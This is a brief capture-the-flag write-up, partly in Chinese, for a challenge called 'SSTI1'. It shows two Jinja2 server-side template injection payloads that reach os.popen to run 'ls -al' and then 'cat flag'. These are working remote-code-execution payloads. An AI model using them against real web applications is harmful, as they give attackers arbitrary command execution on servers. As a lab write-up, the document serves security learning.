## SSTI1
![image](https://github.com/user-attachments/assets/80582f85-c78e-4581-a1b1-978f59d5d673)
![image](https://github.com/user-attachments/assets/119de55d-3919-4169-a731-c784e14b5a0e)

### 解題過程

直接嘗試 RCE，列出目錄

```jinja
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('ls -al').read() }}
```

![image](https://github.com/user-attachments/assets/7fa5996c-37dc-4787-9e04-f8ff16551076)

確認目前目錄下存在 `flag` 檔案
接著將他輸出
```jinja
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('cat flag').read() }}
```
![image](https://github.com/user-attachments/assets/8bccdcd5-e1bb-429e-a875-af32b20c4bb5)
flag get!
